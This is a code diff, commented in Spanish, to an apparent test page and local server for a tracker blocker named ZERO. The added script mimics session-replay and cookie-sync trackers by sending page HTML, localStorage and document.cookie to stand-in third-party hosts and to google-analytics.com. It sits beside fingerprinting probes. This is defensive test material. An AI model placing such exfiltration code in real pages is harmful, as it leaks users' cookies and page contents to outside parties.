@@ -65,6 +65,14 @@ try{navigator.plugins.length}catch(e){}
 try{navigator.geolocation.getCurrentPosition(function(){},function(){});}catch(e){}
 try{new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}).createDataChannel('x');}catch(e){}
 })();
+// lo que hacen las herramientas de grabación de sesión y los sincronizadores de cookies: leer la página entera, las cookies
+// y el almacén, y mandarlos fuera (aquí a dominios ficticios de terceros y a uno de las listas, que ZERO corta)
+setTimeout(function(){try{
+  fetch('https://replay.grabador-ejemplo.net/ingest',{method:'POST',mode:'no-cors',body:JSON.stringify({html:document.body.innerHTML,ls:localStorage.getItem('zg')})}).catch(function(){});
+  new Image().src='https://sync.sincro-ejemplo.net/c?ck='+encodeURIComponent(document.cookie);
+  new Image().src='https://www.google-analytics.com/collect?v=1&cd1='+encodeURIComponent(document.cookie);
+  fetch('/propio/replay',{method:'POST',body:document.body.innerHTML}).catch(function(){});
+}catch(e){}},900);
 // la subasta de anuncios, con la API de Prebid (el /prebid.js local imita a pujadores reales)
 window.pbjs=window.pbjs||{que:[]};
 pbjs.que.push(function(){pbjs.addAdUnits([{code:'hueco-1',mediaTypes:{banner:{sizes:[[300,250]]}},bids:[{bidder:'appnexus'},{bidder:'rubicon'},{bidder:'criteo'},{bidder:'pubmatic'},{bidder:'ix'},{bidder:'openx'}]},{code:'hueco-2',mediaTypes:{banner:{sizes:[[728,90]]}},bids:[{bidder:'appnexus'},{bidder:'rubicon'},{bidder:'criteo'}]}]);pbjs.requestBids({timeout:1200});});
@@ -83,6 +91,7 @@ function sirve(req, res) {
   const u = new URL(req.url, 'http://x');
   const p = u.pathname;
   if (p === '/') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); return res.end(PORTADA); }
+  if (p === '/propio/replay') { res.writeHead(204); return res.end(); }
   if (p === '/prebid.js') { res.writeHead(200, { 'content-type': 'application/javascript' }); return res.end(PREBID); }
   if (p === '/pixel.gif') { res.writeHead(200, { 'content-type': 'image/gif', 'set-cookie': 'uid=abc123; Path=/; SameSite=None; Secure' }); return res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')); }
   if (p === '/salto1') { res.writeHead(302, { location: 'http://localhost:8793/salto2?clic=1' }); return res.end(); }
